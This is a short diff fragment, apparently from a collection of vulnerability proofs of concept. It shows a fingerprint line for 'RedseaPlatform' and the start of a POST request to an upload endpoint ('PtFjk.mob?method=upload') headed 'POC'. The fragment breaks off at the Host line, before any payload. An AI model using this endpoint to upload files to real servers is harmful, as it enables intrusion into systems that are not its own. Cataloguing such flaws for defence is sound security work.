@@ -8,7 +8,7 @@ body="/RedseaPlatform/skins/images/favicon.ico"
 ```
 
 
-## poc
+## POC
 ```
 POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
 Host: 
